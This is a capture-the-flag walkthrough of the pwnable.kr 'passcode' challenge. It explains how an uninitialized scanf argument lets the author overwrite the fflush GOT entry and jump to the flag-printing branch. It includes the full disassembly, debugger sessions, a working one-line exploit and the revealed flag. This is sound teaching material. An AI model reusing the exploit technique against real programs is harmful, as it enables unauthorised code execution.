# passcode — pwnable.kr

## Goal

get the flag

---

## Files Provided

* `passcode`
* `passcode.c` — `passcode`s source
* `flag` — the goal

---

## Walkthrough

```commandline
passcode@ubuntu:~$ ls -l
total 24
-r--r----- 1 root passcode_pwn    42 Apr 19 10:48 flag
-r-xr-sr-x 1 root passcode_pwn 15232 Apr 19 10:54 passcode
-rw-r--r-- 1 root root           892 Apr 19 10:54 passcode.c
passcode@ubuntu:~$ cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

Here we can see the passcode code is not initialized and that there's a bug!
`scanf` gets 2 args, format and ADDRESS, but here in login they pass the value. which means that the value of
`passcode1` and `passcode2` are actually the addresses scanf will put the values in.

So in order to pass the check we need to control the values of passcode1 and 2 before scanf (otherwise we get segfault),
and make sure that their values will be 123456 and 13371337
Which means that the value of passcode1 needs to be its address, and same goes to passcode2

How can we control `passcode1` and `passcode2` values?
They are not initialized so their initial value is what was at the same stack location before.

Here we can "use" the `welcome` function to do so.
In main, we can see that `welcome` is called right before `login`
so the stack pointer should be something like this:
notice that there might be paddings and other things stored there -> need to disassemble to verify

```
 _____
|     | - main start
|     | - welcome start
|     |
|     |
|     |
|     |
|     |
|     |
|     |
| ... | - rest of name
|_____| -> 1. allocate for name [100]
|     |
|     |
|_____|

 _____
|     | - main start
|m    | - welcome start
|y    |
|n    |
|a    |
|m    | 
|e    |
|i    |
|s    |
| ... | - rest of name
|_____| -> 1. scanned for name [100]
|     |
|_____|

 _____
|_____| -> 2. back to main start
|m    | 
|y    |
|n    |
|a    |
|m    | 
|e    |
|i    |
|s    |
| ... | - rest of name
|_____| 
|     |
|_____|

 _____
|_____| - main start
|m    | - login start
|y    |
|n    |
|a____| -> 3. allocated for passcode1
|m    | 
|e    |
|i    |
|s    |
| ... | - rest of name
|_____|
|     |
|_____|

 _____
|_____| - main start
|m    | - login start
|y    |
|n    |
|a    | - allocated for passcode1
|m    | 
|e    |
|i    |
|s____| -> 4. allocated for passcode2
| ... | - rest of name
|_____|
|     |
|_____|
```

Lets disass login:

```shell
pwndbg> disass login
Dump of assembler code for function login:
   0x080491f6 <+0>:	push   ebp
   0x080491f7 <+1>:	mov    ebp,esp
   0x080491f9 <+3>:	push   esi
   0x080491fa <+4>:	push   ebx
   0x080491fb <+5>:	sub    esp,0x10 ; allocate 10
   0x080491fe <+8>:	call   0x8049130 <__x86.get_pc_thunk.bx> ; calling conventions stuff
   0x08049203 <+13>:	add    ebx,0x2dfd ; calling conventions stuff
   0x08049209 <+19>:	sub    esp,0xc ; allocate 12
   0x0804920c <+22>:	lea    eax,[ebx-0x1ff8] ; get the string that is stored there
   0x08049212 <+28>:	push   eax
   0x08049213 <+29>:	call   0x8049050 <printf@plt> ; prints "enter passcode1 : "
   0x08049218 <+34>:	add    esp,0x10 ; go back up 10
   0x0804921b <+37>:	sub    esp,0x8 ; allocate 8 for the passcodes
   0x0804921e <+40>:	push   DWORD PTR [ebp-0x10] ; passcode1
   0x08049221 <+43>:	lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:	push   eax
   0x08049228 <+50>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:	add    esp,0x10
   0x08049230 <+58>:	mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:	mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:	sub    esp,0xc
   0x0804923b <+69>:	push   eax
   0x0804923c <+70>:	call   0x8049060 <fflush@plt>
   0x08049241 <+75>:	add    esp,0x10
   0x08049244 <+78>:	sub    esp,0xc
   0x08049247 <+81>:	lea    eax,[ebx-0x1fe2]
   0x0804924d <+87>:	push   eax
   0x0804924e <+88>:	call   0x8049050 <printf@plt>
   0x08049253 <+93>:	add    esp,0x10
   0x08049256 <+96>:	sub    esp,0x8
   0x08049259 <+99>:	push   DWORD PTR [ebp-0xc] ; passcode2
   0x0804925c <+102>:	lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:	push   eax
   0x08049263 <+109>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x08049268 <+114>:	add    esp,0x10
   0x0804926b <+117>:	sub    esp,0xc
   0x0804926e <+120>:	lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:	push   eax
   0x08049275 <+127>:	call   0x8049090 <puts@plt>
   0x0804927a <+132>:	add    esp,0x10
   0x0804927d <+135>:	cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:	jne    0x80492ce <login+216>
   0x08049286 <+144>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:	jne    0x80492ce <login+216>
   0x0804928f <+153>:	sub    esp,0xc ; happy flow
   0x08049292 <+156>:	lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>:	push   eax
   0x08049299 <+163>:	call   0x8049090 <puts@plt>
   0x0804929e <+168>:	add    esp,0x10
   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    esi,eax
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    esp,0x8
   0x080492b0 <+186>:	push   esi
   0x080492b1 <+187>:	push   eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    esp,0x10
   0x080492ba <+196>:	sub    esp,0xc
   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:	push   eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
   0x080492c9 <+211>:	add    esp,0x10
   0x080492cc <+214>:	jmp    0x80492ea <login+244>
   0x080492ce <+216>:	sub    esp,0xc ; sad flow
   0x080492d1 <+219>:	lea    eax,[ebx-0x1fab]
   0x080492d7 <+225>:	push   eax
   0x080492d8 <+226>:	call   0x8049090 <puts@plt>
   0x080492dd <+231>:	add    esp,0x10
   0x080492e0 <+234>:	sub    esp,0xc
   0x080492e3 <+237>:	push   0x0
   0x080492e5 <+239>:	call   0x80490b0 <exit@plt>
   0x080492ea <+244>:	nop ; end flow
   0x080492eb <+245>:	lea    esp,[ebp-0x8]
   0x080492ee <+248>:	pop    ebx
   0x080492ef <+249>:	pop    esi
   0x080492f0 <+250>:	pop    ebp
   0x080492f1 <+251>:	ret    
End of assembler dump.
```

Using gdb I figured I can run the file with a breakpoint at login, passing a name of 100 different characters to see
But sadly I only affect passcode1
when passing 
`~}|{zyxwvutsrqponmlkjihgfedcba_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA?>=<;:9876543210/.-,+*)('&$#"!AbCdEfGh`
using 
```shell
pwndbg> break login
Breakpoint 1 at 0x80491fb
pwndbg> run
Starting program: /home/passcode/passcode 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.
enter you name : ~}|{zyxwvutsrqponmlkjihgfedcba_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA?>=<;:9876543210/.-,+*)('&$#"!AbCdEfGh
Welcome ~}|{zyxwvutsrqponmlkjihgfedcba_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA?>=<;:9876543210/.-,+*)('&$#"!AbCdEfGh!
```
using `x/s` to print values:
```shell
pwndbg> x/s $ebp - 0x10
0xffda69a8:	"EfGh"
pwndbg> x/s $ebp - 0xc
0xffda69ac:	""
```
We can easliy see we only affect passcode1 and not passcode2.
This is a major breakthrough tough.
Now we can write to name an address we'd like to write something to it.

Seeing how next `fflush` is called gave me an idea.
We can override the `fflush` GOT address with the happy flow address
so it will jump to there

`fflush` is defined not in this passcode.c but in an outer scope, that the linker knows how to reach.
then in the code we call `fflush@plt` -> thats not fflush but a function that jumps to fflush.
So we can override that one

The happy flow address we want is:

The fflush plt helps us get the GOT address we want to override:
```shell
0x0804923c <+70>:	call   0x8049060 <fflush@plt>
...
pwndbg> disass 0x8049060
Dump of assembler code for function fflush@plt:
   0x08049060 <+0>:	jmp    DWORD PTR ds:0x804c014 ; <-- this one (thats the address that stores the fflush address in GOT)
   0x08049066 <+6>:	push   0x10
   0x0804906b <+11>:	jmp    0x8049030
End of assembler dump.
```
Its value is currently:
```shell
pwndbg> print/x *0x804c014
$1 = 0x8049066
```
And we want to set its value to be:
```shell
   0x0804927d <+135>:	cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:	jne    0x80492ce <login+216>
   0x08049286 <+144>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:	jne    0x80492ce <login+216>
   0x0804928f <+153>:	sub    esp,0xc ; <-- this one (after the if)
```
It's int value is 
```python
int(0x0804928f)
# 134517391
```
Using python to construct the bytes:
(the passcode1 scanf translates it to number %d, while the name scanf doesn't)
```shell
python3 -c "import sys; sys.stdout.buffer.write(b'a'*96 + b'\x14\xc0\x04\x08' + b'\n' + b'134517391' + b'\n')" | ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
enter passcode1 : Login OK!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
Now I can safely trust you that you have credential :)
```